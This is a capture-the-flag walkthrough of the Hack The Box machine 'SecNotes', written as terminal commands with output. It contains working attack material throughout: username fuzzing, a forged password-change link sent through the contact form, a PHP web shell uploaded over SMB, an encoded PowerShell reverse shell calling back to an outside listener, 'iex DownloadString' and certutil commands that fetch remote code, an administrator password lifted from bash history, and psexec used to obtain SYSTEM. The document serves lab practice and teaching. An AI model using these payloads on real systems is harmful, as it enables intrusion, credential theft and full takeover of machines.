# secnotes: https://app.hackthebox.com/machines/SecNotes

```bash
nmap -sC -sV 10.10.10.97            
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 12:32 BST
Nmap scan report for secnotes.htb (10.10.10.97)
Host is up (0.084s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2023-04-29T04:32:36-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-04-29T11:32:37
|_  start_date: N/A
```

```bash
nmap -sC -sV 10.10.10.97 -p- 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 12:33 BST
Nmap scan report for secnotes.htb (10.10.10.97)
Host is up (0.095s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m01s, deviation: 4h02m32s, median: 0s
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer nabme: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2023-04-29T04:37:32-07:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-04-29T11:37:29
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

```bash
visit 10.10.10.97

/signup
username: jokerjoker
Password: jokerjoker
```

```bash
cat /etc/hosts | grep -i 10.10.10.97
10.10.10.97	secnotes.htb
```

```bash
wfuzz -c -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -u http://secnotes.htb/login.php -d "username=FUZZ&password=jokerpassword" --hs "No account found with that username."

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://secnotes.htb/login.php
Total requests: 10177

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                          
=====================================================================

000009512:   200        34 L     91 W       1276 Ch     "tyler"                                          
```

```bash
#Update the password request in Burp

POST /change_pass.php HTTP/1.1
Host: 10.10.10.97
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Origin: http://10.10.10.97
Connection: close
Referer: http://10.10.10.97/change_pass.php
Cookie: PHPSESSID=436uobii2d8ktne9fmlidcmm3q
Upgrade-Insecure-Requests: 1

password=jokerjoker2&confirm_password=jokerjoker2&submit=submit

#send it to the repeater and change the request method as GET, then copy it as below
/change_pass.php?password=jokerjoker2&confirm_password=jokerjoker2&submit=submit

#the full url
http://secnotes.htb/change_pass.php?password=jokerjoker2&confirm_password=jokerjoker2&submit=submit
```

```bash
visit http://10.10.10.97/contact.php

#add the url as message
http://secnotes.htb/change_pass.php?password=jokerjoker2&confirm_password=jokerjoker2&submit=submit

#visit http://10.10.10.97/login.php
Login as Tyler:
username:tyler
password:jokerjoker2

#after login as tyler you will get the creds in the note called "new site"
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

```bash
crackmapexec smb secnotes.htb -u tyler -p '92g!mA8BGjOirkL%OG*&' --shares
SMB         secnotes.htb    445    SECNOTES         [*] Windows 10 Enterprise 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
SMB         secnotes.htb    445    SECNOTES         [+] SECNOTES\tyler:92g!mA8BGjOirkL%OG*& 
SMB         secnotes.htb    445    SECNOTES         [+] Enumerated shares
SMB         secnotes.htb    445    SECNOTES         Share           Permissions     Remark
SMB         secnotes.htb    445    SECNOTES         -----           -----------     ------
SMB         secnotes.htb    445    SECNOTES         ADMIN$                          Remote Admin
SMB         secnotes.htb    445    SECNOTES         C$                              Default share
SMB         secnotes.htb    445    SECNOTES         IPC$                            Remote IPC
SMB         secnotes.htb    445    SECNOTES         new-site        READ,WRITE       
```

```bash
smbclient \\\\secnotes.htb\\new-site -U tyler                          

Password for [WORKGROUP\tyler]:
Try "help" to get a list of possible commands.

smb: \> dir
  .                                   D        0  Sat Apr 29 13:44:02 2023
  ..                                  D        0  Sat Apr 29 13:44:02 2023
  iisstart.htm                        A      696  Thu Jun 21 16:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 16:26:03 2018
```

```bash
cat joker.php                                                            
<?php echo system($_REQUEST['joker']); ?>

smb: \> put joker.php 
putting file joker.php as \joker.php (0.1 kb/s) (average 0.1 kb/s)
```
```bash
curl "http://secnotes.htb:8808/joker.php?joker=whoami"
secnotes\tyler
secnotes\tyler
```

```bash
curl "http://secnotes.htb:8808/joker.php?joker=whoami"
```

```bash
#generated via revshells.com
curl "http://secnotes.htb:8808/joker.php?joker=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgAiACwANwAwADcAMAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2BACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3D"
```

```bash
rlwrap -cAr nc -lvnp 7070
listening on [any] 7070 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.97] 63462
whoami
secnotes\tyler
PS C:\inetpub\new-site> 
```

```bash
PS C:\Users\tyler\Desktop> type user.txt
251486cc1bad3a87b25b7a6c4003a9c4
```
```bash
python -m http.server 9998
Serving HTTP on 0.0.0.0 port 9998 (http://0.0.0.0:9998/) ...
```

```bash
https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat
iex(Net-Object Net-WebClient).downloadString('http://10.10.16.6:9998/winPEAS.bat')

iex(New-Object Net.WebClient).DownloadString('http://10.10.14.52:9003/Invoke-PowerShellTcp.ps1')
```

```bash
powershell.exe -exec bypass -Command “& {iex((New-Object System.Net.WebClient).DownloadFile('http://10.10.16.6:9998/winPEASx64.exe','C:\Users\tyler\Desktop'));}”

(new-object System.Net.WebClient).DownloadFile('http://10.10.16.6:9998/winPEASx64.exe','C:\Users\tyler\Desktop')

certutil -urlcache -split -f "http://10.10.16.6:9998/winPEAS.bat" winpeas.bat
```

```bash
PS C:\users\tyler\Desktop> dir

    Directory: C:\users\tyler\Desktop

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        6/22/2018   3:09 AM           1293 bash.lnk                                                              
-a----         8/2/2021   3:32 AM           1210 Command Prompt.lnk                                                    
-a----        4/11/2018   4:34 PM            407 File Explorer.lnk                                                     
-a----        6/21/2018   5:50 PM           1417 Microsoft Edge.lnk                                                    
-a----        6/21/2018   9:17 AM           1110 Notepad++.lnk                                                         
-ar---        4/29/2023   4:25 AM             34 user.txt                                                              
-a----        8/19/2018  10:59 AM           2494 Windows PowerShell.lnk   
```

```bash
PS C:\users\tyler\Desktop> cat bash.lnk
L?F w??????V?	?v(???	??9P?O? ?:i?+00?/C:\V1?LIWindows@	???L???LI.h???&WindowsZ1?L<System32B	???L???L<.p?k?System32Z2??LP? bash.exeB	???L<??LU.?Y????bash.exeK-J????C:\Windows\System32\bash.exe"..\..\..\Windows\System32\bash.exeC:\Windows\System32?%?
                                  ?wN?�?]N?D.??Q???`?Xsecnotesx?<sAA??????o?:u??'?/?x?<sAA??????o?:u??'?/?=	?Y1SPS?0??C?G????sf"=dSystem32 (C:\Windows)?1SPS??XF?L8C???&?m?q/S-1-5-21-1791094074-1363918840-4199337083-1002?1SPS0?%??G�??`????%
	bash.exe@??????
                       ?)
                         Application@v(???	?i1SPS?jc(=?????O??MC:\Windows\System32\bash.exe91SPS?mD??pH?H@.?=x?hH?(?bP
```

```bash
Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss

    Hive: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Lxss

Name                           Property                                                                                
----                           --------                                                                                
{02893575-609c-4e3b-a426-00f9d State             : 1                                                                   
9b271da}                       DistributionName  : Ubuntu-18.04                                                        
                               Version           : 1                                                                   
                               BasePath          : C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState                                                              
                               PackageFamilyName : CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc  
```

```bash
PS C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState> dir

    Directory: 
    C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
da----        6/21/2018   6:03 PM                rootfs                                                                
d-----        4/29/2023   6:29 AM                temp      
```

```bash
PS C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs> cd root
PS C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root> dir

    Directory: C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalStat
    e\rootfs\root

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        6/22/2018   2:56 AM                filesystem                                                            
-a----        6/22/2018   3:09 AM           3112 .bashrc                                                               
-a----        6/22/2018   2:41 PM            398 .bash_history                                                         
-a----        6/21/2018   6:00 PM            148 .profile                                                              

PS C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root> cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
exit
```

```bash
#Creds
administrator%u6!4ZwgwOM#^OBf#Nwnh
```
```bash
impacket-psexec administrator@secnotes.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on secnotes.htb.....
[*] Found writable share ADMIN$
[*] Uploading file voRzFAeK.exe
[*] Opening SVCManager on secnotes.htb.....
[*] Creating service MATk on secnotes.htb.....
[*] Starting service MATk.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami
nt authority\system
```

```bash
C:\Users\Administrator\Desktop> type root.txt
c5b9c78b1fcea78c5e0eaa98e7f5f155
```

***References*** <br>
<https://www.revshells.com/><br>
<https://learn.microsoft.com/en-us/windows/wsl/troubleshooting><br>
